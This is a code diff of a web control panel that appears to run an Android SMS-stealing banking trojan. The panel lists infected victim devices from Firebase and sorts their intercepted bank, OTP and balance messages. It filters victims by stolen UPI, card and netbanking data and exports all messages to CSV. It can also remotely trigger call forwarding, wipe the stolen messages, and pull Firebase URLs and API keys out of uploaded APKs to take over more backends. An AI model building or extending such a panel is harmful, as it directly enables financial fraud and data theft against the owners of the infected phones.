+    if (d.status === 'Online') on++; else off++;
+    var allM = [];
+    if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); });
+    if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });
+    sms += allM.length;
+    allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; });
+  });
+  document.getElementById('sTotal').textContent = ids.length;
+  document.getElementById('sOnline').textContent = on;
+  document.getElementById('sOffline').textContent = off;
+  document.getElementById('sSms').textContent = sms;
+  document.getElementById('sBank').textContent = bank;
+}
+function isLiked(id) { return liked.indexOf(id) !== -1; }
+function toggleLike(id) { if (isLiked(id)) liked = liked.filter(function(x) { return x !== id; }); else liked.push(id); localStorage.setItem('liked', JSON.stringify(liked)); renderDevs(); updStar(); }
+function updStar() { var b = document.getElementById('btnStar'); if (b) b.textContent = isLiked(curId) ? '⭐' : '☆'; }
+function renderDevs() {
+  var g = document.getElementById('deviceGrid');
+  var q = (document.getElementById('searchBox').value || '').toLowerCase();
+  var ids = Object.keys(devs).filter(function(id) {
+    var d = devs[id];
+    if (curFilter === 'online' && d.status !== 'Online') return false;
+    if (curFilter === 'offline' && d.status === 'Online') return false;
+    if (curFilter === 'liked' && !isLiked(id)) return false;
+    if (curFilter === 'upi' && !d.upi_data) return false;
+    if (curFilter === 'card' && !d.card_data) return false;
+    if (curFilter === 'bank' && !d.netbanking_data) return false;
+    var s = (id + ' ' + (d.device_model || '') + ' ' + (d.sim_info && d.sim_info.sim1_number || '')).toLowerCase();
+    return s.indexOf(q) !== -1;
+  });
+  if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices</div>'; return; }
+  ids.sort(function(a, b) { return (devs[b].first_install_timestamp || 0) - (devs[a].first_install_timestamp || 0); });
+  g.innerHTML = ids.map(function(id) {
+    var d = devs[id];
+    var m = d.device_model || d.device_name || 'Unknown';
+    var b = d.battery || '0%';
+    var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
+    var lk = isLiked(id);
+    var pc = d.photos ? Object.keys(d.photos).length : 0;
+    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + id + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>';
+  }).join('');
+  g.querySelectorAll('.device-card').forEach(function(c) {
+    c.addEventListener('click', function(e) {
+      if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; }
+      openDev(this.getAttribute('data-id'));
+    });
+  });
+}
+function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#10B981'; if (p >= 20) return '#F59E0B'; return '#EF4444'; }
+function esc(t) { if (!t) return ''; var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
+function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || '').toUpperCase();
+  if (b.indexOf('OTP') !== -1) return 'OTP';
+  if (b.indexOf('BAL') !== -1) return 'BALANCE';
+  if (b.indexOf('CREDIT') !== -1) return 'CREDIT';
+  if (b.indexOf('DEBIT') !== -1) return 'DEBIT';
+  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1) return 'BANK';
+  return 'ALERT';
+}
+function bankName(sender) { var s = (sender || '').toUpperCase();
+  if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC';
+  if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS';
+  if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe';
+  if (s.indexOf('GPAY') !== -1) return 'GPay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm';
+  return 'Bank';
+}
+function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
+function extractTx(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/gi); return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : ''); }
+function detectFromSms(allMsgs) { var phones = {}, nets = {};
+  allMsgs.forEach(function(m) { var t = (m.body || '') + ' ' + (m.sender || '');
+    var pm = t.match(/\b[6-9]\d{9}\b/g); if (pm) pm.forEach(function(p) { phones[p] = true; });
+    var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/); if (nm) nets[nm[1]] = true;
+  });
+  return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
+}
+
+// ═══ NEW ACCOUNT ═══
+function showNewAcc() { document.getElementById('pinView').style.display = 'none'; document.getElementById('newAccView').style.display = 'block'; document.getElementById('newErr').textContent = ''; document.getElementById('bulkInput').value = ''; document.getElementById('newUrl').value = ''; document.getElementById('newKey').value = ''; document.getElementById('apkStatus').classList.remove('show'); }
+function hideNewAcc() { document.getElementById('pinView').style.display = 'block'; document.getElementById('newAccView').style.display = 'none'; }
+function parseBulkInput(text) {
+  var accounts = [], seenUrls = {};
+  var urlRegex = /https?:\/\/[a-zA-Z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
+  var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
+  var urls = text.match(urlRegex) || [], keys = text.match(keyRegex) || [];
+  for (var i = 0; i < urls.length; i++) {
+    var url = urls[i].trim();
+    if (seenUrls[url]) continue;
+    seenUrls[url] = true;
+    accounts.push({ url: url, apiKey: keys[i] || keys[0] || RTO_CONFIG.apiKey, name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','') });
+  }
+  return accounts;
+}
+function bulkConnect() {
+  var text = document.getElementById('bulkInput').value.trim();
+  if (!text) { document.getElementById('newErr').textContent = 'Paste URLs first'; return; }
+  var accounts = parseBulkInput(text);
+  if (accounts.length === 0) { document.getElementById('newErr').textContent = 'No valid URL'; return; }
+  var list = getSavedAccounts(); var added = 0;
+  accounts.forEach(function(acc) { var dup = list.findIndex(function(a) { return a.url === acc.url; }); if (dup === -1) { list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey }); added++; } });
+  saveAccounts(list);
+  document.getElementById('newErr').textContent = '✅ Added ' + added;
+  renderAccounts();
+  setTimeout(function() { hideNewAcc(); renderAccounts(); }, 800);
+}
+function handleApkUpload(file) {
+  var status = document.getElementById('apkStatus'); status.classList.add('show'); status.textContent = '⏳ Reading...';
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    try {
+      JSZip.loadAsync(e.target.result).then(function(zip) {
+        var foundUrls = [], foundKeys = [];
+        var promises = [];
+        zip.forEach(function(path, f) {
+          if (f.dir || path.indexOf('.so') !== -1) return;
+          promises.push(f.async('uint8array').then(function(bytes) {
+            scanText(bytesToUtf8(bytes));
+            if (path.indexOf('.arsc') !== -1 || path.indexOf('.xml') !== -1 || path.indexOf('.dex') !== -1) { scanText(bytesToUtf16(bytes, true)); scanText(bytesToUtf16(bytes, false)); }
+            if (path.indexOf('.dex') !== -1) scanText(extractDex(bytes));
+          }).catch(function() {}));
+        });
+        Promise.all(promises).then(function() {
+          var u = dedup(foundUrls);
+          if (u.length > 0) { document.getElementById('newUrl').value = u[0]; status.textContent = '✅ Found ' + u.length + ' URLs'; }
+          else status.textContent = '⚠️ No URL found';
+          if (foundKeys.length > 0) document.getElementById('newKey').value = foundKeys[0];
+        });
+        function dedup(a) { var o=[],s={}; a.forEach(function(x){if(!s[x]){s[x]=1;o.push(x);}}); return o; }
+        function bytesToUtf8(b) { try { return new TextDecoder('utf-8').decode(b); } catch(e) { var s=''; for (var i=0;i<b.length;i++) s+=String.fromCharCode(b[i]); return s; } }
+        function bytesToUtf16(b, le) { try { return new TextDecoder(le?'utf-16le':'utf-16be').decode(b); } catch(e) { return ''; } }
+        function extractDex(b) { var r='',c=''; for (var i=0;i<b.length;i++){var x=b[i]; if(x>=32&&x<=126)c+=String.fromCharCode(x); else{if(c.length>=4)r+=c+'\n';c='';}} return r; }
+        function scanText(t) {
+          if (!t) return;
+          var ps = [/https?:\/\/[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com/g, /https?:\/\/[a-zA-Z0-9-]+\.firebaseio\.com/g, /https?:\/\/[a-zA-Z0-9-]+\.[a-z0-9-]+\.firebasedatabase\.app/g];
+          ps.forEach(function(p) { var m = t.match(p); if (m) m.forEach(function(u) { if (u.indexOf('http') !== 0) u = 'https://' + u; foundUrls.push(u); }); });
+          var km = t.match(/AIzaSy[A-Za-z0-9_-]{33}/g); if (km) km.forEach(function(k) { foundKeys.push(k); });
+        }
+      }).catch(function(e) { status.textContent = '❌ ' + e.message; });
+    } catch(e) { status.textContent = '❌ ' + e.message; }
+  };
+  reader.readAsArrayBuffer(file);
+}
+function saveNewAcc() {
+  var url = document.getElementById('newUrl').value.trim(), key = document.getElementById('newKey').value.trim(), err = document.getElementById('newErr');
+  if (!url || url.indexOf('firebaseio') === -1) { err.textContent = '❌ Invalid URL'; return; }
+  if (!key) key = RTO_CONFIG.apiKey;
+  var list = getSavedAccounts(), dup = list.findIndex(function(a) { return a.url === url; });
+  var acc = { name: url.replace('https://','').replace('.firebaseio.com',''), url: url, apiKey: key };
+  if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; } else list.push(acc);
+  saveAccounts(list);
+  err.textContent = '✅ Opening panel...';
+  setTimeout(function() { currentAccount = acc; hideNewAcc(); openPanel({ apiKey: key, databaseURL: url, projectId: url.replace('https://','').replace('.firebaseio.com','') }, acc.name); }, 600);
 }
 
 // ═══ EVENT LISTENERS ═══
@@ -1074,7 +1045,7 @@ document.getElementById('dOverlay').addEventListener('click', closeDev);
 document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
 document.getElementById('searchBox').addEventListener('input', renderDevs);
 document.getElementById('btnStar').addEventListener('click', function() { toggleLike(curId); });
-document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete device?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
+document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
 document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
 document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
 document.getElementById('btnCallFwd').addEventListener('click', openCallFwd);
@@ -1082,23 +1053,15 @@ document.getElementById('cfClose').addEventListener('click', closeCallFwd);
 document.getElementById('cfActivate').addEventListener('click', function() { sendCallFwd('activate'); });
 document.getElementById('cfDeactivate').addEventListener('click', function() { sendCallFwd('deactivate'); });
 document.getElementById('cfCheck').addEventListener('click', function() { sendCallFwd('check_status'); });
-document.querySelectorAll('[data-cfsim]').forEach(function(x) {
-  x.addEventListener('click', function() {
-    document.querySelectorAll('[data-cfsim]').forEach(function(y) { y.classList.remove('active'); });
-    this.classList.add('active');
-    cfSimSlot = parseInt(this.getAttribute('data-cfsim'));
-  });
-});
+document.querySelectorAll('[data-cfsim]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-cfsim]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); cfSimSlot = parseInt(this.getAttribute('data-cfsim')); }); });
 document.getElementById('cfOverlay').addEventListener('click', function(e) { if (e.target.id === 'cfOverlay') closeCallFwd(); });
 document.getElementById('btnCsv').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
   var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
 });
-document.getElementById('btnFb').addEventListener('click', function() { var url = (currentAccount && currentAccount.url) || RTO_CONFIG.databaseURL; alert('Firebase: ' + url); });
+document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + (currentAccount && currentAccount.url)); });
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
-
-// INIT
 renderAccounts();
 </script>
 </body>
